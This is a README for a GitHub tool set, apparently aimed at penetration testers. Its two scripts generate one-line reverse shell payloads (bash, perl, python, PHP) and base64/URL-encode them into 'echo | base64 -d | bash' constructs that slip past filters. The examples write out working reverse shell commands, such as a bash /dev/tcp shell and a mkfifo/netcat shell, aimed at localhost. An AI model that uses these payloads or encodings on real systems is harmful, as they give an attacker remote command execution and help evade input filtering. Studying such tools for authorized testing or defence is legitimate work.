# reverse_shells_tools
Scripts for generating reverse shells based mostly on PayloadAllTheThings.

Using one script you can generate one-line reverse shell payloads.

Using the other script you can base64 encode the reverse shell payload when appropiate. This encoding takes into account bad chars for supporting channels as http (url friendly base64 encoded payloads).

I normally use the one-liner to pipe the result into the encoder when appropiate.

The tools are **2 scripts**:
- **rs_oneliner.py**: Mostly one-liner reverse shell generator, based on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- **rs_b64encode.py**: Use it in convination with **rs_oneliner.py** when appropiate payloads are used (payloads normally to be executed in a bash context). Using the **--echo** It can help you constructing an *echo <base64_encoded_payload> | base64 -d | bash* construct. And with **--echo** and **--url** it will use **url encode** the payload too.

## How to use

Minimal execution needs:

```bash
git clone https://github.com/arale61/reverse_shells_tools.git
cd reverse_shells_tools
python ./rs_oneliner.py -h
python ./rs_b64encode.py -h
```

How **I prefer to use it**:
- I have my own **local bin path** where **these scripts are copied** and **set as executables**:
```
~/.local/bin/rs_oneliner.py
~/.local/bin/rs_b64encode.py
```
- This **local bin path is added in my PATH** environment variable in my .zshrc or .bashrc:
```
export PATH=$PATH:$HOME/.local/bin
```
- Then use them as any other executable available for you.

## Examples:


1. Simple bash tcp reverse shell:
```bash
./rs_oneliner.py -i 127.0.0.1 -p 6161 --bash
```


2. Simple bash udp reverse shell:
```bash
./rs_oneliner.py -i 127.0.0.1 -p 6161 --bash --udp
```


3. Simple perl tcp reverse shell for windows:
```bash
./rs_oneliner.py -i 127.0.0.1 -p 6161 --perl --win
```


4. Pipe into rs_b64encode.py:
```bash
./rs_oneliner.py -i 127.0.0.1 -p 6161 --bash | ./rs_b64encode.py
```


5. Pipe into rs_b64encode.py and construction echo decode payload:
```bash
./rs_oneliner.py -i 127.0.0.1 -p 6161 --bash | ./rs_b64encode.py --echo
```


6. Pipe into rs_b64encode.py and construction echo decode url_quote_plus encode payload:
```bash
./rs_oneliner.py -i 127.0.0.1 -p 6161 --bash | ./rs_b64encode.py --echo --url
```


7. Simple safe base64 encode:
```bash
./rs_b64encode.py -p 'bash -i >& /dev/tcp/127.0.0.1/6161 0>&10'
```


8. Simple safe base64 encode and use echo decode construct:
```bash
echo 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 6161 >/tmp/f' | ./rs_b64encode.py --echo
#or
./rs_b64encode.py -p 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 6161 >/tmp/f' --echo
```


9. Pipe with rs_oneliner.py:
```bash
./rs_oneliner.py -i 127.0.0.1 -p 6161 --python | ./rs_b64encode.py
```


10. Pipe with rs_oneliner.py and construction echo decode payload:
```bash
./rs_oneliner.py -i 127.0.0.1 -p 6161 --perl | ./rs_b64encode.py --echo
```


11. Pipe into rs_b64encode.py and construction echo decode url_quote_plus encode payload:
```bash
./rs_oneliner.py -i 127.0.0.1 -p 6161 --phpsystem | ./rs_b64encode.py --echo --url
```
